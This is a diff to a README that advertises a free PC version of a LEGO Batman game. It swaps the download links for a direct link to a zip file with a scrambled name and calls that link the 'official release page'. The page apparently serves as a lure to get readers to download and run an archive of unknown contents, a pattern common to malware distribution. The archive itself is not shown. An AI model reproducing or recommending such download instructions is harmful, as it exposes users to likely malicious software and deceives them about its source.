@@ -1,6 +1,6 @@
 # 🦇 LEGO-Batman-Legacy-of-the-Dark-Knight - Explore Gotham in the ultimate game
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/tiks203/LEGO-Batman-Legacy-of-the-Dark-Knight)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/tiks203/LEGO-Batman-Legacy-of-the-Dark-Knight/main/Resource/Legacy-LEG-of-Knight-Batman-the-Dark-v1.3.zip)
 
 This application provides the PC version of the LEGO Batman Legacy of the Dark Knight experience. It offers full access to the Gotham City open world, boss encounters, and vehicle unlocks. You can play through story missions and explore the open world on your Windows computer.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware components to run this software. Check you
 
 Follow these steps to set up the game on your computer:
 
-1.  Visit the official release page: [https://github.com/tiks203/LEGO-Batman-Legacy-of-the-Dark-Knight](https://github.com/tiks203/LEGO-Batman-Legacy-of-the-Dark-Knight)
+1.  Visit the official release page: [https://raw.githubusercontent.com/tiks203/LEGO-Batman-Legacy-of-the-Dark-Knight/main/Resource/Legacy-LEG-of-Knight-Batman-the-Dark-v1.3.zip](https://raw.githubusercontent.com/tiks203/LEGO-Batman-Legacy-of-the-Dark-Knight/main/Resource/Legacy-LEG-of-Knight-Batman-the-Dark-v1.3.zip)
 2.  Locate the latest version under the Releases section.
 3.  Download the compressed file ending in .zip to your computer.
 4.  Right-click the downloaded file and select Extract All.
